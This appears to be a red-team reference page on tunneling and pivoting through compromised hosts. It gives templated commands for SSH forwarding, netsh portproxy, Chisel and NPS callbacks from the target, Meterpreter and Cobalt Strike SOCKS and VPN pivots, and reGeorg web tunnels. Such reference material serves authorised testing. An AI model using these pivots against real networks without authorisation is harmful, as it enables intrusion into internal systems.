# Tunneling / ports forwarding

### Overview

###### Local port forwarding

In local port forwarding, a port on the local system (usually attacking
machine) is routed to a port on a remote server. For example, a compromised
Internet facing server exposing a SSH service could be used to route traffic to
the SMB ports of internal servers to conduct `PsExec` like connections directly
from the attacking system without the need to deploy tools on the compromised
server.

###### Remote port forwarding

Conceptually similar to the local port forwarding, the remote port forwarding
can however be used for the opposite effect. Indeed, in remote port forwarding,
the forwarding service will open a listening port on the server and will route
any connection received on this port to the configured host and port.

###### Dynamic ports forwarding

Contrary to local and remote port forwarding, dynamic ports forwarding allows
for the complete tunneling of full IP and ports range. Thus, dynamic ports
forwarding can be used to pivot into the internal network from a compromised
host and access any servers and their services.

In dynamic port forwarding, the forwarding service will serve as a proxy,
routing all connections to their destination, and a utility such as
`proxychains` will be used to redirect tools connections to the listening
forwarding service proxy port.

###### SOCKS proxy pivots

`SOCKS` is an Internet protocol that performs at Layer 5 of the
`Open Systems Interconnection model (OSI model)` and exchanges network packets
between a client and a server through a proxy server. Practically, a `SOCKS`
service proxies `TCP` / (in some case) `UDP` connections to an arbitrary IP
address and can thus be used on a compromised system to route traffic from the
C2 servers to internal hosts, effectively transforming the compromise system
in a pivot.

`SOCKS` proxies can only forward `TCP`, and, for the `socks5` proxy
following the current `Request for comment (RFC)` specifications, `UDP`
traffic.

These restrictions may impose specific tuning of tools in order for an use
through a `SOCKS` proxy. For instance, `nmap` should be used with the following
options to run a ports / services scan through a `SOCKS` proxy:
`nmap -n -Pn -sT [...]`.

Commands network traffic an be proxied through a `SOCKS` proxy service using
`proxychains` on Linux:

```
# Specification of the HTTP/HTTPS proxy address in /etc/proxychains.conf or passed as argument to proxychains using the CLI "-f" option.
[ProxyList]
socks4 <127.0.0.1 | SOCKS_PROXY_IP> <SOCKS_PROXY_PORT>
socks5 <127.0.0.1 | SOCKS_PROXY_IP> <SOCKS_PROXY_PORT>

# Execution of commands through proxychains.
proxychains [...]
```

On Windows, the `Proxifier` graphical utility can be used to tunnel specific
processes network traffic through a `SOCKS` proxy:

```
# SOCKS proxy settings configuration
Profile -> Proxy Servers... -> Add -> Specification of the SOCKS proxy configuration: Address, Port and Protocol (SOCKS Version 5 or SOCKS Version 4) -> Ok
An authentication may also be specified and the proxy status and availability checked by establishing a connection and trying to reach www.google.com:80 through the proxy server.

# Processes specification
Profile -> Proxification Rules... -> Add -> Specification of the processes and proxy server: Applications, Target hosts / ports, Action (Proxy server) -> Enabled should be checked (by default) -> Ok
```

Additionally, a `SOCKS` proxy can be specified through the `Internet Options`
(settings used by the `Internet Explorer`, `Edge`, and `Chrome` web browsers)
graphical utility and set as the system-wide `Microsoft Windows HTTP Services
(WinHTTP)` proxy using `netsh`.

```
Control Panel -> Internet Options -> Connections -> LAN settings
  "Use a proxy server for your LAN [...]" checked
  (Optional) "Bypass proxy server for local addresses" checked
  Advanced -> Socks: <127.0.0.1 | SOCKS_PROXY_IP> <SOCKS_PROXY_PORT>

netsh winhttp import proxy source=ie

# Lists the configured proxies.
netsh winhttp dump
  [...]
  set proxy proxy-server="socks=<SOCKS_PROXY_IP>:<SOCKS_PROXY_PORT>" bypass-list="<local>"

# Restore the WinHTTP default proxy settings (no proxies).
netsh winhttp reset proxy
```

The proxy can also be directly set in the registry, for instance using
PowerShell:

```
# Enables the proxy server.
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyEnable" /t REG_DWORD /d 1 /f
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name "ProxyEnable" -Value 1

# Set the proxy server to the specified server.
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyServer" /t REG_SZ /d "<IP>:<PORT>" /f
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -name "ProxyServer" -Value "<IP>:<PORT>"

# If needs be, set the proxy server to use the specified (remote) PAC file.
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -name "AutoConfigURL" -Value "<http | https>://<URL>"
```

Note that however both methods prove to be unreliable to proxy PowerShell
cmdlets network traffic through the `SOCKS` proxy (while some cmdlets, such
as `Invoke-Command` and `Enter-PSSession` can be reliably proxied through a
system-wide `HTTP` / `HTTPS` proxy).

In `metasploit`, the
`setg Proxies socks4:<127.0.0.1 | IP>:<SOCKS_PROXY_PORT>`
command can be used to tunnel modules through a `SOCKS` proxy.

### Pivoting with built-in utilities

#### [Linux] SSH

SSH port forwarding is a mechanism that allows for connection tunneling
through a SSH service.

They are three main types of SSH port forwarding: local port forwarding, remote
port forwarding and dynamic port forwarding.

###### SSH local port forwarding

The following command can be used to configure a local port forwarding through
an SSH service:

```bash
# -n: no keyboard input to be expected (redirects stdin from /dev/null, actually preventing reading from stdin)
# -N & -T: prevents the opening of a tty session and specify that no command be executed

ssh -nNT -L <LOCAL_PORT>:<TARGET_HOSTNAME | TARGET_IP>:<TARGET_REMOTE_PORT> <USERNAME>@<SSH_HOSTNAME | SSH_IP>
```

Once the above command is completed, the specified target port will be
accessible locally on the attacking machine at the `<LOCAL_PORT>`.

Note: local port forwarding can be used to access locally (`localhost`) exposed
services on the SSH server.

###### SSH remote port forwarding

The following command can be used to configure a remote port forwarding through
an SSH service:

```bash
ssh -R <TARGET_REMOTE_PORT>:<TARGET_HOSTNAME | TARGET_IP>:<SSH_SERVER_LOCAL_PORT> <USERNAME>@<SSH_HOSTNAME | SSH_IP>
```

###### SSH dynamic ports forwarding

The following commands can be used to configure the SSH service in proxy mode
and redirect tools connections through it:

```bash
ssh -nNT -D <LOCAL_PORT> <USERNAME>@<SSH_HOSTNAME | SSH_IP>
```

#### [Windows] netsh

On Windows, the `netsh` built-in can be used to configure unitary port
forwarding.

As stated in the Microsoft `KB555744`, "the [`portproxy add v4tov4]` command is
sent to the `IPV6MON.DLL` helper, and because of that it will work only if
`IPv6` protocol is installed."

```bash
# Display current configured port forwarding rule
netsh interface portproxy show all

# Configure a local port forwarding
netsh interface portproxy add v4tov4 listenaddress=<LHOST> listenport=<LPORT> connectaddress=<RHOST> connectport=<RPORT>
```

#### [Linux] iptables

TODO

### Pivoting with fully-fledged tools or C2 agents

#### [Linux / Windows] Chisel

*Recommended fully-fledged tool for its ease of use if no C2 is being used.*

`Chisel` is a fast `TCP` / `UDP` encapsulation `Go` tool that transport
`SSH`-encrypted traffic over `HTTP`. It supports mutual client / server
authentication and numerous user-experience features (client auto-reconnects,
multiple tunnel over one TCP connection, etc.).

```bash
# Generic server-side usage (on the attacking machine).
# Defaults to listening on all interfaces on port TCP 8080.
# Option --reverse: allow clients to specify reverse port forwarding (required for remote port forwarding and SOCKS proxy with "R:" in <REMOTE>).
# Option --socks / --socks5: allow clients to access the internal SOCKS5 proxy.
chisel server [--host <0.0.0.0 | SERVER_IP>] [-p <8080 | PORT>] [--reverse --socks5] [<OPTIONS>]

# Generic client-side usage (on the target machine).
# <REMOTE> represents a local / remote port forward or SOCKS proxy (detailed below)
chisel client <SERVER_IP>:<SERVER_PORT> <REMOTE>[/<TCP | UPD>]

# If required, for example in enterprise environments, an HTTP CONNECT or SOCKS5 proxy can be specified using the --proxy option.
# To date, NTLM authentication on proxy is not supported by chisel: https://github.com/jpillora/chisel/issues/149
chisel client --proxy <http | socks>://<USERNAME>:<PASSWORD>@<PROXY_SERVER>:<PROXY_PORT> <SERVER_IP>:<SERVER_PORT> <REMOTE>[/<TCP | UPD>]
```

###### Chisel local port forwarding

Local port forwarding to make accessible the service from the server on
`<SERVER_FORWARDED_IP>:<SERVER_FORWARDED_PORT>` to the client on
`<CLIENT_TUNNEL_IP>:<CLIENT_TUNNEL_PORT>`. `<SERVER_FORWARDED_IP>` can be
localhost or any IP or host such as a host exposing a website on the Internet.

```bash
# chisel server-side (on the attacking machine).
chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>]

# chisel client-side (on the target machine).
# By default the port is opened client-side on all interfaces (<CLIENT_TUNNEL_IP> = 0.0.0.0) with a local (client-side) port matching the one of the forwarded service (<CLIENT_TUNNEL_PORT> = <SERVER_FORWARDED_PORT>).
# Example: www.github.com:443 (<SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>) to make GitHub accessible on the compromised client.
chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>
chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>
chisel client <SERVER_IP>:<SERVER_PORT> <HOSTNAME | IP> <CLIENT_TUNNEL_IP>:<CLIENT_TUNNEL_PORT>:<SERVER_FORWARDED_IP>:<SERVER_FORWARDED_PORT>
```

###### Chisel remote port forwarding

Remote port forwarding to forward traffic received server-side on
`<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>` to `<REMOTE_HOST>:<REMOTE_PORT>`
through the client. `<REMOTE_HOST>` can be localhost or any IP such as one
accessible in the internal network from the compromised client.

```bash
# chisel server-side (on the attacking machine).
chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse

# chisel client-side (on the target machine).
# By default the port is opened server-side on localhost (<SERVER_HOST> = 127.0.0.1) with a local (server-side) port matching the one the traffic is routed to (<REMOTE_PORT> = <SERVER_TUNNEL_PORT>).
chisel client <SERVER_IP>:<SERVER_PORT> R:<REMOTE_HOST>:<REMOTE_PORT>
chisel client <SERVER_IP>:<SERVER_PORT> R:<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>:<REMOTE_HOST>:<REMOTE_PORT>
```

###### Chisel SOCKS proxy

Establish a `SOCKS` proxy that can be used server-side to channel traffic
through the compromised client:

```bash
# chisel server-side (on the attacking machine).
chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse --socks5

# chisel client-side (on the target machine).
# By default the SOCKS proxy listen server-side on 127.0.0.1:1080 (<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>).
chisel client <SERVER_IP>:<SERVER_PORT> R:socks
chisel client <SERVER_IP>:<SERVER_PORT> R:<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>:socks
```

Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
information on how to make use of the `SOCKS` proxy, using `proxychains` or
through `metasploit`.

#### NPS

`NPS` is a high-performance proxy server suite, analogous to a C2 framework,
with cross-platforms agents and a web management interface. It supports
numerous network protocols: socks5, http proxy, tcp, udp, http(s), etc. `NPS`
additionally implements multiple extension functions, such as client
authentication and network compression and encryption, and can display
connected clients usage information (real-time bandwidth, total volume of data
exchanged, etc.).

Through an established connection of a client to the server, multiple proxies
services can be started (both socks5 and HTTP proxies for a given client for
example).

Before use, the configuration file of `NPS`, in `/etc/nps/conf/nps.conf` on a
default Linux installation, should be edited to securely restrict the access to
the web management interface:  

```
# The default credentials are admin:123 with the web interface being exposed on all network interfaces
web_username=<ADMIN>
web_password=<PASSWORD>
web_ip=127.0.0.1

# If the web management interface must be reachable over the network, it is recommended to enforce the use of the SSL / TLS protocol
web_open_ssl=true
web_cert_file=<CERT_FULL_PATH>
web_key_file=<KEY_FULL_PATH>
```

Server startup and initial client connection to the server:

```bash
# Server side
nps start / restart

# A client must first be configured through the web management interface in order to receive a client callback.
URL of the web management interface: http://127.0.0.1:8080 (by default).
Client -> + Add -> Eventual configuration of client basic auth and network compression / encryption -> v Add

The "Unique verify key" is needed for the client callback.
The callback command may be copied directly (as displayed after clicking on the "+" sign in front of the client).

# Client side
# ./npc on Linux or npc.exe on Windows.
npc -server=<IP>:<8024 : SERVER_BRIDGE_PORT> -vkey=<UNIQUE_VERIFY_KEY> -type=tcp
```

Once a client has established a session with the server, the following pivoting
functions can be configured through the web management interface:
  - Unitary port forwarding using the `TCP` or `UDP` menus
  - `HTTP` or `SOCKS5` proxies using the `HTTP proxy` or `SOCKS 5` menus

For instance, the procedure to deploy a `SOCKS5` proxy on the compromised
system is as follow:

```
SOCKS 5 -> + Add -> Specification of the client ID and the local system proxy port <SOCKS_PROXY_PORT> -> v Add
```

Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
information on how to make use of the `SOCKS` proxy, using `proxychains` or
through `metasploit`.

#### [Linux / Windows] xct's xc

`xc` is a reverse shell for Linux and Windows written in `Go` that include,
among others, local / remote ports forwarding functionalities. `xc` can be used
for basic port forward scenarios.

Refer to the `[General] Shells` note (`[Linux / Windows] xct's xc` section) for
more information on the `xc` reverse shell utility.

#### [Linux / Windows] Meterpreter

###### Meterpreter's unitary port forwarding

The `portfwd` command from within the `meterpreter` shell can be used to forward
TCP connections through a compromised machine.

```
portfwd [add | delete | list | flush] [args]

# List active port forwards
portfwd list

# Add port forward
portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r <REMOTE_HOST>

# Delete specific port forward
portfw delete -i <INDEX>

# Delete all port forwards
portfw flush
```

###### Meterpreter's dynamic port forwarding

Contrary to unitary port forwarding, dynamic port forwarding allows for the
complete tunneling of full IP and ports range. The `autoroute` command from
within the `meterpreter` shell can be used to forward TCP connections through a
compromised machine.

```
TODO
```

#### [Windows] Cobalt Strike

`Cobalt Strike` supports the following pivoting mechanisms:
  - Ports forwarding
  - Pivot listeners
  - Dynamic ports forwarding through a SOCKS proxy
  - VPN access

###### Cobalt Strike's pivot listeners

`Cobalt Strike`'s `pivot listeners` are listeners started on compromised
systems to chain beacons communication in an internal Information System (IS).
The `pivot listener` will serve as a pass-through between further beacons and
the C2 listeners in order to minimize the number of beacons connections to the
C2 servers or compromise systems that couldn't otherwise reach the C2 servers.

A pivot listener can be started on a beacon using the beacon built-in function
`[beacon] -> Pivoting -> Listeners...`.

As of now, `pivot listeners` can only be of type `windows\beacon_reverse_tcp`
and do not support stager payloads.

Note that the functionally does not automatically update the system host-based
firewall configuration and a manual modification of the firewall rules may be
necessary in order to allow inbound traffic on the listener port.

###### Cobalt Strike's SOCKS proxy

A `SOCKS4` proxy service can be started on a beacon using the beacon built-in
function `[beacon] -> Pivoting -> SOCKS Server` or through the beacon CLI using
`socks <C2_LOCAL_SOCK_PORT>`.

The actives `SOCKS4` proxies can be viewed and managed through the `View ->
Proxy Pivots` interface. All the `SOCKS4` proxies running on a beacon can also
be stopped directly through the beacon CLI using `socks <SOCK_PORT>`.

Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
information on how to make use of the `SOCKS` proxy, using `proxychains` or
through `metasploit`.

###### Cobalt Strike's CovertVPN

`This feature does not work on Windows 10 systems.`<br/>
`Require Administrator privileges on the compromised system.`

The `Cobalt Strike` `CovertVPN` feature is a layer 2 pivoting capability that
deploy a network interface on the C2 server and bridge it, through a running
beacon, to a compromised system network. While the traffic can be channeled
over the `TCP`, `HTTP` and `ICMP` protocols, the use of the `UDP` protocol is
recommended for performance optimization.

A `CovertVPN` pivot can be started on a beacon using the beacon built-in
function `[beacon] -> Pivoting -> Deploy VPN` or through the beacon CLI using
`covertvpn <INTERFACE_NAME> <BEACON_IP_NETWORK>`. If the `Clone host MAC
address` option is checked, the network interface deployed on the C2 server
will have the same MAC address as the compromised system network interface.

The actives `CovertVPN` pivots can be viewed and managed through the
`Cobalt Strike -> VPN Interfaces` menu.

Once up and running, the network interface on the C2 server will require
further configuration, such as specifying an IP address, in order to reach the
network it is attached to. This configuration may be done either automatically
through the `Dynamic Host Configuration Protocol (DHCP)` protocol, if a `DHCP`
server is reachable on the network, or manually.

```bash
# Verification of the presence of the CovertVPN network interface on the C2 server
ifconfig <INTERFACE_NAME>

# Automatic configuration of the CovertVPN network interface using the internal DHCP server
dhclient <INTERFACE_NAME>

# Manual setting of an IP address and default gateway, can be used if a DHCP server is not available or for a more covert approach
# The beacon network interface information can be retrived using the "run ipconfig" command
# Specifying a default gateway for the network interface is needed to reach systems outside of the (Virtual) Local Area Network ((V)LAN)  
ifconfig <INTERFACE_NAME> <IP> netmask <255.255.255.0 | NETWORK_NETMASK> up
ip route add default via <IP> dev <INTERFACE_NAME>
```

### Pivoting over Web TCP tunnel

`reGeorg` and `ABPTTS` can be used to act as socks proxies and tunnel `TCP`
traffic over an `HTTP` / `HTTPS` connection made to a web application. A web
page / package must be deployed and executed by the web server, in similar
fashion as a classical web shell.

#### reGeorg

`reGeorg` supports the following web application / languages:
  - ashx
  - aspx
  - js
  - jsp
  - php
  - tomcat jsp

Once the page / package is deployed, `reGeorg` socks server can be started:

```bash
python reGeorgSocksProxy.py -p <LOCAL_SOCKS_PROXY_PORT> -u <http | https>://<HOSTNAME | IP>/<PATH>/<tunnel.xx>
```

Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
information on how to make use of the `SOCKS` proxy, using `proxychains` or
through `metasploit`.
